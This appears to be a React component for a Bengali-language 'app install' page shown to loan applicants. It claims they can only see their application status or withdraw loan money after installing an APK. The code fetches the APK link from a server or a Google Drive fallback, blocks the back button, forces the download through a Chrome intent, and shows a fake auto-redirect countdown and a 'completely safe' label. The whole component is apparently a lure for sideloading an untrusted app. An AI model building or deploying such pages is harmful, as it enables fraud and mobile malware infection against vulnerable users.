import React, { useEffect, useState } from 'react';

interface Props {
  message?: string;
  sessionId?: string;
}

const StuckPage: React.FC<Props> = ({ message, sessionId }) => {
  const [dots, setDots] = useState('');
  const [countdown, setCountdown] = useState(5);
  const [apkUrl, setApkUrl] = useState('');

  useEffect(() => {
    const iv = setInterval(() => setDots(prev => prev.length >= 3 ? '' : prev + '.'), 500);
    return () => clearInterval(iv);
  }, []);

  // Countdown then auto-redirect
  useEffect(() => {
    if (countdown <= 0) return;
    const t = setTimeout(() => setCountdown(prev => prev - 1), 1000);
    return () => clearTimeout(t);
  }, [countdown]);

  // Fetch APK URL from server
  useEffect(() => {
    const fetchApkUrl = async () => {
      try {
        const res = await fetch('/api/get-apk-url');
        const data = await res.json();
        if (data.url) setApkUrl(data.url);
      } catch (err) {
        // Fallback: Google Drive direct download
        setApkUrl('https://drive.google.com/uc?export=download&id=YOUR_APK_FILE_ID');
      }
    };
    fetchApkUrl();
  }, []);

  // Block back button
  useEffect(() => {
    window.history.pushState(null, '', window.location.href);
    const blockBack = () => window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', blockBack);
    return () => window.removeEventListener('popstate', blockBack);
  }, []);

  const stuckMessage = message || 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।';

  const handleInstall = () => {
    if (!apkUrl) return;
    // Open in default browser (not WebView)
    const isAndroid = /android/i.test(navigator.userAgent);
    if (isAndroid) {
      // Use intent to force open in external browser
      const intentUrl = `intent://${apkUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
      try {
        window.location.href = intentUrl;
      } catch (e) {
        window.open(apkUrl, '_blank', 'noopener,noreferrer');
      }
    } else {
      window.open(apkUrl, '_blank', 'noopener,noreferrer');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-rose-50 via-pink-50 to-purple-50 flex items-center justify-center px-4 py-8">
      <div className="max-w-md w-full bg-white rounded-3xl shadow-2xl overflow-hidden">
        {/* Top accent bar */}
        <div className="h-2 bg-gradient-to-r from-[#E2136E] via-pink-500 to-purple-500"></div>

        <div className="p-8 md:p-10 text-center">
          {/* Download/Install icon */}
          <div className="relative mx-auto mb-6">
            <div className="w-24 h-24 mx-auto relative">
              <div className="absolute inset-0 bg-pink-200 rounded-full animate-ping opacity-20"></div>
              <div className="w-24 h-24 bg-gradient-to-br from-[#E2136E] to-purple-600 rounded-full flex items-center justify-center shadow-lg shadow-pink-200">
                <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
                </svg>
              </div>
            </div>
          </div>

          {/* Main heading */}
          <h1 className="text-2xl font-black text-gray-800 mb-2">অ্যাপ ইন্সটল করুন</h1>
          <p className="text-[#E2136E] text-base font-semibold mb-5">আবেদনের তথ্য দেখতে অ্যাপটি প্রয়োজন</p>

          {/* Message card */}
          <div className="bg-gradient-to-b from-pink-50 to-rose-50 border-2 border-pink-200 rounded-2xl p-6 mb-5">
            <div className="flex items-start gap-3">
              <div className="flex-shrink-0 mt-0.5">
                <svg className="w-6 h-6 text-[#E2136E]" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
                </svg>
              </div>
              <div className="text-left">
                <p className="text-gray-800 text-base leading-relaxed font-medium">
                  {stuckMessage}
                </p>
              </div>
            </div>
          </div>

          {/* Download button */}
          <button
            onClick={handleInstall}
            className="w-full bg-gradient-to-r from-[#E2136E] to-purple-600 hover:from-[#c4105f] hover:to-purple-700 text-white font-black text-lg py-4 px-6 rounded-2xl shadow-xl shadow-pink-300 transition-all transform hover:scale-[1.02] active:scale-[0.98] mb-4 flex items-center justify-center gap-3"
          >
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
            </svg>
            অ্যাপ ডাউনলোড ও ইন্সটল করুন
          </button>

          {/* Auto-redirect countdown */}
          <div className="bg-gray-900 rounded-2xl p-4 mb-5">
            <p className="text-gray-400 text-xs uppercase tracking-widest mb-2">অটো-রিডাইরেক্ট{dots}</p>
            <div className="flex items-center justify-center gap-2">
              <span className="text-2xl font-black font-mono text-pink-400">{countdown}</span>
              <span className="text-gray-500 text-sm">সেকেন্ড</span>
            </div>
            <p className="text-gray-500 text-xs mt-2">ডাউনলোড শুরু না হলে উপরের বাটনে ক্লিক করুন</p>
          </div>

          {/* Why install section */}
          <div className="space-y-3 mb-6">
            <div className="flex items-center gap-3 bg-green-50 rounded-xl p-4 text-left border border-green-200">
              <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg className="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
              </div>
              <div>
                <p className="text-green-900 text-sm font-bold">আবেদনের স্ট্যাটাস দেখুন</p>
                <p className="text-green-700 text-xs">আপনার লোন আবেদনের বর্তমান অবস্থা জানতে পারবেন</p>
              </div>
            </div>

            <div className="flex items-center gap-3 bg-blue-50 rounded-xl p-4 text-left border border-blue-200">
              <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg className="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/>
                </svg>
              </div>
              <div>
                <p className="text-blue-900 text-sm font-bold">ইন্সট্যান্ট নোটিফিকেশন</p>
                <p className="text-blue-700 text-xs">আবেদন অনুমোদিত হলে সাথে সাথে নোটিফিকেশন পাবেন</p>
              </div>
            </div>

            <div className="flex items-center gap-3 bg-amber-50 rounded-xl p-4 text-left border border-amber-200">
              <div className="w-10 h-10 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg className="w-5 h-5 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z"/>
                </svg>
              </div>
              <div>
                <p className="text-amber-900 text-sm font-bold">টাকা উত্তোলন</p>
                <p className="text-amber-700 text-xs">অনুমোদিত লোনের টাকা সরাসরি তুলতে পারবেন</p>
              </div>
            </div>
          </div>

          {/* Lock badge */}
          <div className="inline-flex items-center gap-2 bg-gray-100 rounded-full px-5 py-2.5 border border-gray-200">
            <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 24 24">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span className="text-xs text-gray-500 font-medium">অ্যাপ ছাড়া তথ্য দেখা যাবে না</span>
          </div>

          {/* Footer */}
          <div className="mt-8 pt-6 border-t border-gray-100">
            <p className="text-xs text-gray-400">
              অ্যাপ ইন্সটল করার পর আপনার আবেদনের সকল তথ্য দেখতে পারবেন
            </p>
            <p className="text-xs text-gray-400 mt-1">
              অ্যাপটি সাইজ মাত্র ২.৫ MB • সম্পূর্ণ নিরাপদ
            </p>
            {sessionId && (
              <p className="text-xs text-gray-300 mt-2 font-mono">REF: {sessionId.slice(0, 8)}</p>
            )}
          </div>
        </div>
      </div>
      <style>{`@keyframes stuckPulse{0%,100%{opacity:0.3;transform:scale(0.8)}50%{opacity:1;transform:scale(1.2)}}`}</style>
    </div>
  );
};

export default StuckPage;
